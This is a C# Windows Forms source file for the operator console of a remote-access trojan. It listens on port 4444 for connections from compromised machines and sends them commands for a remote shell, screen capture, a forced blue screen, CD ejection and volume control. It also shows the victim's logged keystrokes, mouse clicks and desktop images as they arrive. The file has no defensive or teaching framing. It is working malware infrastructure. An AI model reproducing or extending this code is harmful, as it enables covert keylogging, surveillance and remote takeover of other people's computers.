using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;
using System.Threading;
using System.Net;
using System.Text.RegularExpressions;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;


namespace Listener
{
    public partial class Form1 : Form
    {
        TcpListener tcpListener;
        Socket socketForServer;
        NetworkStream networkStream;
        MemoryStream memoryStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        StringBuilder strInput;
        Thread th_StartListen, th_RunClient, th_shiftFlash, th_controlFlash, th_LMouseFlash, th_RMouseFlash,
        th_MMouseFlash, th_Remoting, th_ImageListen;
        public Form1()
        {
            InitializeComponent();
            textBox1.ReadOnly = true;
            textBox3.ReadOnly = true;
        }

        private void toolStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            th_StartListen = new Thread(new ThreadStart(StartListen));
            th_StartListen.Start();

//            th_ImageListen = new Thread(new ThreadStart(ImageListen));
  //          th_ImageListen.Start();
            textBox2.Focus();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);

        }

        private void Textbox2_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (e.KeyCode == Keys.Enter)
                {
                    strInput.Append(textBox2.Text.ToString());
                    streamWriter.WriteLine(strInput);
                    streamWriter.Flush();
                    strInput.Remove(0, strInput.Length);

                    if (textBox2.Text == "cls")
                        textBox1.Text = "";
                    textBox2.Text = "";
                }
            }
            catch (Exception err) { }

        }

        private void StartListen()
        {
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 4444);
            tcpListener.Start();
            toolStripLabel1.Text = "Listening on port 4444";


            for (;;)
            {
                socketForServer = tcpListener.AcceptSocket();
                IPEndPoint ipend = (IPEndPoint)socketForServer.RemoteEndPoint;
                toolStripLabel1.Text = "Connection from " + IPAddress.Parse(ipend.Address.ToString());
                th_RunClient = new Thread(new ThreadStart(RunClient));
                th_RunClient.Start();
            }
        }

        private void RunClient()
        {
            networkStream = new NetworkStream(socketForServer);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);
            memoryStream = new MemoryStream();

            strInput = new StringBuilder();
            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\r\n");
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                }
                Application.DoEvents();
                DisplayMessage(strInput.ToString());
                strInput.Remove(0, strInput.Length);


            }
        }

        
        public static Bitmap ByteToImage(byte[] blob)
        {
            Bitmap bmp;
            using (var ms = new MemoryStream(blob))
            {
                bmp = new Bitmap(ms);
                return bmp;
            }

        }
        private void Cleanup()
        {
            try
            {
                streamReader.Close();
                streamWriter.Close();
                networkStream.Close();
                socketForServer.Close();
            }
            catch (Exception err) { }

            toolStripLabel1.Text = "Connection lost";
        }
        private delegate void DisplayDelegate(string message);

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("message");
            streamWriter.Flush();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("beep");
            streamWriter.Flush();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("ejectCD");
            streamWriter.Flush();
        }

        private void button7_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("closeCD");
            streamWriter.Flush();
        }

        private void button8_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("blueScreen");
            streamWriter.Flush();
        }

        private void button9_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("shell");
            streamWriter.Flush();
        }

        private void button6_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("help");
            streamWriter.Flush();
        }

        private void button10_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("capture");
            streamWriter.Flush();
        }

        private void ShiftFlash()
        {
            shiftButton.BackColor = System.Drawing.Color.Red;
            System.Threading.Thread.Sleep(1000);
            shiftButton.BackColor = System.Drawing.Color.White;
        }

        private void clear2_Click(object sender, EventArgs e)
        {
            textBox3.Clear();
        }

        private void clear1_Click(object sender, EventArgs e)
        {
            textBox1.Clear();
        }

        private void volUp_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("incVol");
            streamWriter.Flush();
        }

        private void volDown_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("decVol");
            streamWriter.Flush();
        }

        private void enterText_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("textEntry");
            streamWriter.Flush();
        }


        private void volMute_Click(object sender, EventArgs e)
        {
            streamWriter.WriteLine("muteVol");
            streamWriter.Flush();
        }

        private void ControlFlash()
        {
            controlButton.BackColor = System.Drawing.Color.Red;
            System.Threading.Thread.Sleep(1000);
            controlButton.BackColor = System.Drawing.Color.White;

        }

        private void RMouseFlash()
        {
            rightMouse.BackColor = System.Drawing.Color.Red;
            System.Threading.Thread.Sleep(1000);
            rightMouse.BackColor = System.Drawing.Color.White;

        }

        private void LMouseFlash()
        {
            leftMouse.BackColor = System.Drawing.Color.Red;
            System.Threading.Thread.Sleep(1000);
            leftMouse.BackColor = System.Drawing.Color.White;

        }

        private void MMouseFlash()
        {
            middleMouse.BackColor = System.Drawing.Color.Red;
            System.Threading.Thread.Sleep(1000);
            middleMouse.BackColor = System.Drawing.Color.White;

        }


        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void ImageGrab()
        {
            BinaryFormatter formatter = new BinaryFormatter();
            byte[] imageData;
            Image image;

            for (;;)
            {
                try {

                    image = (Image)formatter.Deserialize(ImageStreamNetwork.networkStream);
                    desktopBox.Image = image;
                }

                catch(Exception ex) { break; }
            }
        }

        private void DisplayMessage(string message)
        {
            string word = Regex.Match(message, @"\((\w+)\)").Groups[1].Value;

            if (textBox1.InvokeRequired)
            {
                Invoke(new DisplayDelegate(DisplayMessage), new object[] { message });
            }
            else
            {
                if (word == "keylog")
                {
                    string key = Regex.Match(message, @"\[(\w+)\]").Groups[1].Value;

                    if (key == "ShiftKey" || key == "LShiftKey")
                    {
                        th_shiftFlash = new Thread(new ThreadStart(ShiftFlash));
                        th_shiftFlash.Start();
                    }

                    else if (key == "Space")
                    {
                        textBox3.AppendText(" ");
                    }

                    else if (key == "ControlKey" || key == "LControlKey" || key == "RControlKey")
                    {
                        th_controlFlash = new Thread(new ThreadStart(ControlFlash));
                        th_controlFlash.Start();
                    }

                    else if (key == "LButton")
                    {
                        th_LMouseFlash = new Thread(new ThreadStart(LMouseFlash));
                        th_LMouseFlash.Start();
                    }

                    else if (key == "MButton")
                    {
                        th_MMouseFlash = new Thread(new ThreadStart(MMouseFlash));
                        th_MMouseFlash.Start();
                    }

                    else if (key == "RButton" )
                    {
                        th_RMouseFlash = new Thread(new ThreadStart(RMouseFlash));
                        th_RMouseFlash.Start();
                    }
                    
                    else
                    {
                        textBox3.AppendText(key);
                    }
                    
                }

                else if (word == "Image")
                {
                    string size = Regex.Match(message, @"\[(\w+)\]").Groups[1].Value;
                    int sizeInt = Int32.Parse(size);
                    byte[] buffer = new byte[sizeInt];
                    
                        networkStream.Read(buffer, 0, sizeInt);
                    
                    desktopBox.Image = ByteToImage(buffer);
                }

                else
                {
                    textBox1.AppendText(message);
                }


               

    }
        }
      }
}

   

